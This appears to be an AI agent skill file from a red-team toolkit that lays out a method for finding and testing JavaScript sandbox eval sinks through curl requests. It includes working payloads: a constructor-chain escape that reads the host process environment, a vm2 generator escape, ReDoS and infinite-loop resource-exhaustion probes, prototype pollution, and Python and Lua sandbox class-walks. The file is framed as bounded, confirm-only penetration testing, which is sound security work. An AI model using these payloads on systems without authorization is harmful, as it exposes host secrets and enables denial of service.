---
name: sandboxed-code-execution
description: Detect and safely test sandboxed code execution sinks (eval, node vm/notevil/vm2) for escape and resource-exhaustion primitives
origin: RedteamOpencode
---

# Sandboxed Code Execution Testing

## When to Activate

- A request field is evaluated as JavaScript, a template, or serialized code inside a sandbox (`eval`, `new Function`, `node:vm`, `vm2`, `notevil`, or a smart-contract/DSL interpreter)
- The task is to detect a reachable code-eval sink and prove it, or to confirm the sandbox boundary holds
- A dev/testing or unlinked route exposes a code-sandbox page

## Tools

`run_tool curl`, `python3`, `awk`, `grep`, `sed`, `printf`

## Methodology

### 1. Locate the Code-Eval Sink

Find the exact request field and endpoint that feeds an evaluated expression. Enumerate the client bundle for `eval`, `new Function`, `vm.run`, `notevil`, `orderLinesData`, or a sandbox route string before sending anything.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 https://HOST/main.js -o "$DIR/scans/sandbox_bundle.js"
grep -nEi 'eval\(|new Function|vm\.run|notevil|sandbox|orderLinesData|\.runInNewContext' "$DIR/scans/sandbox_bundle.js" > "$DIR/scans/sandbox_sinks.txt"
grep -oE '/#[A-Za-z0-9_./-]+' "$DIR/scans/sandbox_bundle.js" | sort -u > "$DIR/scans/sandbox_routes.txt"
```

A sink is a named field plus its endpoint; do not probe a field until the bundle or a saved request names it.

### 2. Confirm Evaluation with a Benign Marker

Send one benign expression whose evaluated result is observable in the response, and save the request/response pair. If the result is not reflected or deducible, treat the sink as unconfirmed.

```bash
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' \
  --data '{"cid":"probe","orderLinesData":"1+1"}' https://HOST/b2b/v2/orders \
  -D "$DIR/scans/sandbox_benign.headers" -o "$DIR/scans/sandbox_benign.body"
```

Distinguish "evaluated and reflected" from "silently rejected" using the response body, status, and any error text. Do not escalate without that signal.

### 3. Probe the Sandbox Guard (bounded)

Send one bounded infinite-loop or long-iteration expression and one slow-but-terminating expression. Record the guard behavior (loop guard vs. timeout vs. no guard); this is diagnostic, not a DoS claim.

```bash
printf '%s\n' '{"cid":"probe","orderLinesData":"while(true){}"}' > "$DIR/scans/sandbox_loop.json"
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' \
  --data-binary @"$DIR/scans/sandbox_loop.json" https://HOST/b2b/v2/orders \
  -D "$DIR/scans/sandbox_loop.headers" -o "$DIR/scans/sandbox_loop.body"
printf '%s\n' '{"cid":"probe","orderLinesData":"/((a+)+)b/.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\")"}' > "$DIR/scans/sandbox_redos.json"
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' \
  --data-binary @"$DIR/scans/sandbox_redos.json" https://HOST/b2b/v2/orders \
  -D "$DIR/scans/sandbox_redos.headers" -o "$DIR/scans/sandbox_redos.body"
```

A `Infinite loop detected` response means the guard held; a `503 ... timed out` from a finite-but-slow payload means the timeout is the only limit. Neither is exploited further here — this step only maps the boundary.

### 4. Test a Sandbox Escape Primitive

For one evidence-guided escape class only (prototype/`constructor` chain, `process`/`require` reachability, `Function` constructor, or host-object leakage), send a single read-only probe and require an observable marker. Never attempt a destructive or persistent escape.

```bash
printf '%s\n' '{"cid":"probe","orderLinesData":"this.constructor.constructor(\"return process\")().env"}' > "$DIR/scans/sandbox_escape.json"
run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Content-Type: application/json' \
  --data-binary @"$DIR/scans/sandbox_escape.json" https://HOST/b2b/v2/orders \
  -D "$DIR/scans/sandbox_escape.headers" -o "$DIR/scans/sandbox_escape.body"
```

An escape is a finding only when the marker (for example a `process`/`env`/`require` value) appears in the response. A difference in error text alone is not code execution.

Beyond the `constructor` chain, try these evidence-guided escape classes one at a time, each with a single read-only marker request:
- **Prototype pollution reaching the sandbox global**: `{"__proto__":{"polluted":"1"}}`-style payload sent to an unrelated endpoint first, then check whether the sandbox's global object reflects `polluted` — proves the sandbox shares a prototype chain with polluted application state.
- **Generator/iterator escape** (older vm2 CVE class): `(function*(){})().constructor.constructor("return process")().env` — vm2's `Proxy`-based guard has historically missed generator function constructors.
- **Error-handler stack unwind**: throwing inside the sandbox and inspecting `err.constructor.constructor` from a caught-exception object, which in some `node:vm` configurations still resolves to the host `Function` constructor.
- **Template/SSTI crossover**: if the "sandbox" is actually a template engine (Jinja2, Handlebars, Twig, EJS) rather than a JS VM, pivot to `ssti-testing` — the escape primitives (`{{ ''.__class__.__mro__ ... }}`, Handlebars `lookup`) differ by engine and are covered there, not here.
- **`node:vm` shared-realm leakage**: unlike `vm2`, the built-in `node:vm` module does not create a fully isolated realm by default — an object passed into the `contextify`'d sandbox (via `vm.createContext(sandbox)`) still shares its prototype chain with the host realm unless the host explicitly freezes it. Probe with `this.constructor.constructor` first; if blocked, try reaching a passed-in helper object's `.constructor.constructor` instead, since host-supplied bridge objects are a common oversight.
- **`Atomics.wait` / worker-thread main-loop block**: a sandbox that runs on the same thread as the main event loop can be starved (not escaped) by a single `Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, N)` call inside the eval'd expression — this is a DoS primitive distinct from a memory-safety escape; report it under the guard-boundary step (3), not as an escape.
- **WebAssembly bridge escape**: if the sandbox exposes a `WebAssembly.instantiate`/`compile` primitive, a compiled module's imported host functions are a potential bridge to unsandboxed host code — probe with a benign import-table read (`Object.keys(importObject)`) rather than instantiating an actual `.wasm` binary.
- **Buffer/TypedArray host-memory view**: in older `vm2` releases, a `Buffer` instance created inside the sandbox could alias host process memory because `Buffer` is backed by a C++ addon that `vm2`'s proxy-based membrane did not fully virtualize — a single `Buffer.from` read-length probe (never a write) is enough to confirm the class is reachable at all.
- **Non-JS interpreter equivalents**: for a Python `RestrictedPython`/`exec` sandbox, the equivalent chain-walk probe is `().__class__.__bases__[0].__subclasses__()` to enumerate reachable classes without calling one; for a Lua sandbox (`lua_sandbox`, Redis `EVAL`), check whether `string.dump`/`load` or the `debug` library remains reachable from the restricted environment — each is a single read-only marker request, not a payload chain.

### 5. Classify and Hand Off

Record the sink, the exact payload, the guard behavior, and the confirmed signal. Promote to `stage=vuln_confirmed` only on a reproduced escape or a demonstrated timeout-with-impact; a held guard is an observation, not a finding.

```bash
printf '%s\n' \
  "sink: field + endpoint" \
  "guard: loop-guard | timeout | none" \
  "signal: reflected marker | escape primitive | timeout" \
  "stage=vuln_confirmed only after a reproduced escape or timeout-with-impact" \
  > "$DIR/scans/sandbox_handoff.txt"
```

## References

`references/vuln-checklists/A05-injection.md`, `references/vuln-checklists/A10-exceptional-conditions.md`, `references/vuln-checklists/A04-cryptographic-failures.md`, `references/handoff-protocols.md`.

## Confirm-Only Rule

Sink discovery, guard probing, and a single escape attempt are confirm-stage. A finding requires a reproduced escape or a demonstrated timeout with impact; a held guard or a changed error message is an observation. Do not run destructive, persistent, or multi-variant escape campaigns. Full exploitation belongs to exploit-developer.

## Budget

At most 6 evaluated expressions per sink and 10 minutes wall-clock; one probe per escape class, no brute force, no persistence, no destructive payloads.
